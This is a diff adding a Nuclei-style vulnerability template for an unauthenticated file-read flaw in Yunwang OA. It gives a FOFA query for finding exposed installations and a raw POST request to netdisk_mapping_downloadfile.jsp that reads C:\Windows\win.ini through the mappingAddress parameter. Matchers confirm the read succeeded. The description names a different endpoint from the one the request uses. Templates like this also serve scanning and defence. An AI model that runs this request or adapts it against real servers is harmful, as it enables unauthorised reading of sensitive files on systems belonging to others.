@@ -1,0 +1,32 @@
+id: yunwang-oa-netdisk_mapping_downloadfilejsp-unauthorized-access
+info:
+  name: 云网OA netdisk_mapping_downloadfile.jsp 未授权访问
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="云网OA"
+    云网OA（又称一米OA）系基于Spring Boot + Vue3架构开发的企业级低代码协同办公平台，兼容MySQL、Oracle等多种数据库环境，支持本地化私有化部署。
+    攻击者可通过向 /public/netdisk_mapping_getfile.jsp 发送POST请求，利用文件路径验证逻辑缺失缺陷获取敏感文件。
+  tags: 云网OA
+http:
+- raw:
+  - |
+    POST /public/netdisk_mapping_downloadfile.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: JSESSIONID=1; skincode=lte; name=; pwd=
+    Connection: close
+
+    fileName=admin&mappingAddress=C:\Windows\win.ini
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - for 16-bit app support
